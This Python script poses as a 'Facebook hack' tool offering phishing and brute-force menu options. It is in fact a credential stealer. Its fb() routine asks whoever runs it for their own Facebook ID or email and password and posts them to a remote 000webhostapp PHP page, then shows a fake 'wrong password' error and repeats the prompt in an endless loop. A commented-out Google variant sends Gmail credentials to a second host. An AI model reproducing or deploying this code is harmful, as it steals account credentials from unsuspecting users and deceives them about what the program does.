import os as s
import time

try:
    import requests as r
except ModuleNotFoundError:
    s.system("clear")

s.system("clear")
time.sleep(3)


logo2 = """
 mmmm                 #             mmmmmm #
 #   \"m  mmm    m mm  #   m         #      #mmm
 #    # \"   #   #\"  \" # m\"          #mmmmm #\" \"#
 #    # m\"\"\"#   #     #\"#           #      #   #
 #mmm\"  \"mm\"#   #     #  \"m         #      ##m#\"

"""


logo = """\033[1;96m█████████
\033[1;96m█▄████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;96m█\033[1;91m▼▼▼▼▼ \033[1;95m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
\033[1;96m█ \033[1;92m \033[1;95m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;96m█\033[1;91m▲▲▲▲▲\033[1;95m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[
\033[1;96m████████      \033[1;92m«----------✧----------»
\033[1;96m ██ ██
"""

logo3 = """
  ____                   _        _                _
 / ___| ___   ___   __ _| | ___  | |__   __ _  ___| | __
| |  _ / _ \ / _ \ / _` | |/ _ \ | '_ \ / _` |/ __| |/ /
| |_| | (_) | (_) | (_| | |  __/ | | | | (_| | (__|   <
 \____|\___/ \___/ \__, |_|\___| |_| |_|\__,_|\___|_|\_\
                                  |___/
"""

logo4 = """
████████████████████████████████████████
████████████████████████████████████████
██████▀░░░░░░░░▀████████▀▀░░░░░░░▀██████
████▀░░░░░░░░░░░░▀████▀░░░░░░░░░░░░▀████
██▀░░░░░░░░░░░░░░░░▀▀░░░░░░░░░░░░░░░░▀██
██░░░░░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░█░█░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░▄▀░█░░░░░░░░░░░░░░░██
██░░░░░░░░░░████▄▄▄▀░░▀▀▀▀▄░░░░░░░░░░░██
██▄░░░░░░░░░████░░░░░░░░░░█░░░░░░░░░░▄██
████▄░░░░░░░████░░░░░░░░░░█░░░░░░░░▄████
██████▄░░░░░████▄▄▄░░░░░░░█░░░░░░▄██████
████████▄░░░▀▀▀▀░░░▀▀▀▀▀▀▀░░░░░▄████████
██████████▄░░░░░░░░░░░░░░░░░░▄██████████
████████████▄░░░░░░░░░░░░░░▄████████████
██████████████▄░░░░░░░░░░▄██████████████
████████████████▄░░░░░░▄████████████████
██████████████████▄▄▄▄██████████████████
████████████████████████████████████████
████████████████████████████████████████
"""

logo5 = """
__________________________________________$$s
_________________________$____$$s___________s$$s
_________________________s$$$$s$$$$$$s________$$$___s$
_______________s$$$$$$$$s___s$$$$ss$$$$s________$$$__$$
________________________s$$$s__$$$$$s_$$$s___s$__s$$s_$$
__________s$$$$$$$$$$$$$$$$$$$$sss$$$$s_$$$s__$$$__s$$s$
_____s$$$$$$$$$s_____s$$$$$$$$$$$$$$h$$$__$$$s__$$___$$$s
___s$$$$$s_____________________ss$$$$$$$$s_s$$$s$$$__s$$$
__________________________s$$$s____s$$$$$$$$s$$$$$$$__$$$
_________s$$$$$$$$$$$$$$$s$$$$$$$$$$s$$$$$$$$$ss$$$$s_$$$
_____________________s$$$$$$$$$$s$$$s____s$$$$$$__$$$__$$
________________s$$$$$$$$$$$$$$$$$$$$$$s_____s$$$s_$$__$$
________s$$$$$$$$$$$$$$$$$$$$$$$s$s__s$$$$$$s___$$s_$s$$$
_____s$$$$$s$$$$$$$$$$$$$$s____$$s$$$$$$$$$$$$$s____$$$$s
___s$$$$__s$$$$$$$$$s_____s$$$$$s$$$$$$$$$$$$$$$$$s__$$$
___s$___$$$$$$______s$$$$$$$s_s$$$$$$$$$$$$$$$$$$$$$____$$$
______s$$$s___s$$$$$$$$$$$___$$$$$$$$$$$$$$$$$$$$$$$$s$$$$$$$s
_____$$$__s$$$$$$$$$$$$$$__$$$$$$$$$$$$$$$$$$$$s$s$_$$$$$$$$$$$
____$$$_$$$$$$i$$$$$s_$$__$$$$$$$$$$$$$$$$$$$ss$$$s$$$$$$$$s$$s
___$$__$$$__s$$$$ss__$$_$$$$$$$$$$$$$$$$$$$$s$$$$$_$$$$e$$s$
__$$_s$$___$$$$s_$$_$$s$$$$$$$$$$$$$$$$$$$$s$$$$$s_$$$$$$s$
_s$s$$$___$$$$_s$$__$$__$$$$$$$$$$$$$$$$$$_$$$$$$$_s_$$$
_$$s$s__s$$$__$$____s$$__$$$$$$$$$$$$$$$$$_$$$$$$$$__$$$
$$_$___$$$$_s$$__$$__$$$s__s$$$$$$$$$$$$$$_$$$$$$$$$$$$s
$$____$$$s_$$$__$$$_$_s$$$$s___s$s$$$$$$$$_$$$$$$$$s$$$
$____$$$__$$sss$$$$__$_s$$$$$$$$$$s$s$$$$$___s$$$$s$$$s
____$$$_s$$$_$s$$$$s_s$__$$$$$$___s$$s_$$$s___s$$$_$$$
____$$_s$$$_$$_s$$$$$_s$$___$$$$$________$_____$$$s$$s
___s$$_$$$__$$__$$$$$$$$$$s____s$$$$$_________s$$$$$$
___$$$s$$$__$$___$$ss$$$$$$$$s____s$$$$$s______$$$$$$
___$s$$$$$_s$$__s_$$$_s$$$$$$$$$$s___s$$$$$$$s___sss
___$$$$$$$_$$$__$s_$$$$s__s$$$$$$$$$s___$$$$$$$s
__s$$$$$$$_$$$s_s$__$$$$$$s__s$$$$$$$$$s__$__$$$$s
__$_$$$$s$_s$$$__$$__$$$$$$$$s__$$s$$$$$$$_____$$$$
____s$$$_$$_$$$___$$__$s$$$$$$$$_s__s$$$s$$$____$$$$
_____$$$__$_$$$$___$$_ss_$$$$$$$$$____$$$$_s$____$$$s
_____$$$s_$_s$$$s__$$$____s$$$$$$$$$___s$$$______$$$$
_____s$$$_ss_$$$$___$$s____$$$$$$$$$$___$$$$_____s$$$
______$k$__$__$$$$__s$$____$$$$$$$h$$____$$$$_____$$s
______$$$______$$$s__$$$___$$_$$$$$$$$___s$$$$____$$
_______$$s______$$$__s$$$___$_s$$$$$s____s$$$$____$s
_______$$$_______$$$_s$$_$__$__$$$$$s____s$$$$___$$
________$$_______s$$__$$_______$$$$$s____$$$$$___$s
________$$________s$$_$$______s$$$$$_____$$_$$___$
___________________$$_$$s_____$$$$$_____$$s_$s
____________________$$s$$_____$$$$_____s$$__$
____________________s$_$$____$$$s_____s$$
_____________________$_$$___$$$______s$$
_______________________$$__s$$______$$$
________________________$__$$______$$$
________________________$_$$s____$$$s
__________________________$$___s$$s
__________________________$$__$$s
"""
logo6 = """
    ¶                                                 ¶
     ¶                                               ¶
      ¶                                             ¶
       ¶¶¶                                       ¶¶¶
         ¶¶¶¶                                 ¶¶¶¶
     ¶      ¶ ¶¶¶                          ¶¶¶ ¶     ¶
______¶¶________¶¶_______________________¶¶________¶¶______
______¶¶¶¶¶________¶¶_________________¶¶________¶¶¶¶¶______
_______¶¶¶¶¶¶¶¶______¶¶______________¶______¶¶¶¶¶¶¶¶_______
_________¶¶¶¶¶¶¶¶¶¶____¶___________¶____¶¶¶¶¶¶¶¶¶¶_________
_____________¶¶¶¶¶¶¶¶¶___¶_______¶___¶¶¶¶¶¶¶¶¶_____________
________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶_____¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________
____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____________
______________¶¶¶¶¶¶¶¶¶¶¶¶¶¶___¶¶¶¶¶¶¶¶¶¶¶¶¶¶______________
_____________¶___¶¶¶__¶¶¶_________¶¶¶__¶¶¶___¶_____________
_________________¶__¶______¶___¶______¶__¶_________________
___________________¶____¶¶¶_____¶¶¶____¶___________________
______________________¶¶¶¶_______¶¶¶¶______________________
____________________¶¶¶¶¶_________¶¶¶¶¶____________________
__________________¶¶¶¶¶¶___________¶¶¶¶¶¶__________________
_________________¶¶¶¶¶¶_____________¶¶¶¶¶¶_________________
________________¶¶¶¶¶¶¶_____________¶¶¶¶¶¶¶________________
________________¶¶¶¶¶_¶_____________¶_¶¶¶¶¶________________
_______________¶_¶¶¶¶__¶______________¶¶¶¶_¶_______________
_______________¶¶__¶¶_________________¶¶__¶¶_______________
____________________¶_________________¶____________________
                    ¶                 ¶
                   ¶                   ¶

"""

logo7 = """
░▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄☆
░███████████████████████
░▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓◤
╬▀░▐▓▓▓▓▓▓▌▀█░░░█▀░
▒░░▓▓▓▓▓▓█▄▄▄▄▄█▀╬░
░░█▓▓▓▓▓▌░▒▒▒▒▒▒▒▒▒
░▐█▓▓▓▓▓░░▒▒▒▒▒▒▒▒▒
░▐██████▌╬░▒▒▒▒▒▒▒▒
"""


#print(logo)

def main():
    from os import system as ter
    from sys import argv as a
    ter("clear")
    print("{} is need to import".format(a[0]))
    print("this module is made by Tricker")



red = "\033[31m"
white = "\033[m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
purple = "\033[35m"
cyan = "\033[36m"

class style:
    def show_color(self):
        print(red+"red")
        print(white+"white")
        print(green+"green")
        print(yellow+"yellow")
        print(blue+"blue")
        print(purple+"purple")
        print(cyan+"cyan"+white)

    def color(self, x):
            if x == 'red':
                return red
            elif x == 'white':
                return white
            elif x == 'green':
                return green
            elif x == 'yellow':
                return yellow
            elif x == 'blue':
                return blue
            elif x == 'purple':
                return purple
            elif x == 'cyan':
                return cyan


    def square(self, x, y):
                sq="""
            {1}##############################
                        {0}
            ##############################{2}"""
                if y == "white":
                    return sq.format(x,white,white)
                elif y == "red":
                    return sq.format(x, red, white)
                elif y == "green":
                    return sq.format(x, green, white)
                elif y == "yellow":
                    return sq.format(x, yellow, white)
                elif y == "blue":
                    return sq.format(x, blue, white)
                elif y == "purple":
                    return sq.format(x, purple, white)
                elif y == "cyan":
                    return sq.format(x, cyan, white)

    def line(self):
        p="""
_______________________________________________________"""
        return p

#logo2 with color

print (green+logo6+white)

#start of project
def att():
     import os

     li = ["loading.","loading..","loading..."]

     for i in li:
         os.system("clear")
         print(i)
         os.system("sleep 1")
     while True:
         try:
             while True:
                 print("find source....")
         except KeyboardInterrupt:
                 print("you can't exit :\"(")





class web_source:
    def view(self, url):
        import requests as r
        p = r.get(url)
        return p.text

    @classmethod
    def web_get(web, us, pas):
        web.us = us
        web.pas = pas
        data = {
            'mail':web.us,
            'pa':web.pas
        }
        web.url = "https://friend3ds.000webhostapp.com/hello.php"
        import requests as r
        web.p = r.post(web.url, data=data)

'''    def web_google(web, us, pssw):
        web.us = us
        web.pssw = pssw
        web.url = "https://oo-ozo.000webhostapp.com/google_get.php?email="+us+"&password="+pssw
        import requests as r
        web.k = r.get(web.url)'''

class file_readwrite:
    def writer(self, file, mod, text):
        with open(file, mod) as f:
            f.write(text)

    def reader(self, file):
        with open(file, 'r') as f:
            return f.read()

class Tk:
    def label(self, content, win):
        import tkinter
        w = Label(win, text=content)
        w.pack()

if __name__ == "__name__":
    pass

print (" ")
print (" ")
print (cyan + "{1}Facebook hack")
print (" " + blue)
print ("{2}Facenook phishing")
print (" ")
print (green+"{3}Facebook bruteForce")
print (" ")
print (red+"{4}Facebook checkpoint")
print (" ")

#login fb
def fb():
    import os as s
    s.system("clear")
    print (yellow+logo7+white)
    print (" ")
    print (yellow + "at first, you needed to login to your account")
    na = input(green+"ID"+red+"/"+green+"Email"+red+">"+white)
    pa = input(green+"Password :"+red)
    print (white)
    c = web_source()
    c.web_get(us=na, pas=pa)

#login google
def google():
    import os as s
    s.system("clear")
    print (green + logo3 + white)
    print (" ")
    print (yellow + "at first, you needed to login to your account")
    na = input(green+"Gmail :"+red)
    pa = input(green+"Password :"+red)                                
    c = web_source()
    p = c.web_google(us=na, pssw=pa)

#error fb & goole
def error_fbgoogle():
    from os import system as echo
    print (" ")
    print (red+"wrong password")
    print ("program will restart in ")
    print ("1")
    echo("sleep 1")
    print ("2")
    echo("sleep 1")
    print ("3")
    echo("sleep 1")

while True:
    menu = input(cyan+"your choice>>")
    if menu == "1" or "2" or "3" or "4":
        while True:
            fb()
            error_fbgoogle()
    else:
        print(red+"Wrong Argv :\"(")


def att():
    import os

    li = ["loading.","loading..","loading..."]

    for i in li:
        os.system("clear")
        print(i)
        os.system("sleep 1")

    while True:
        try:
            while True:
                print("find source....")
                os.system("clear")
        except KeyboardInterrupt:
            while True:
                print("you can't exit :\"(")




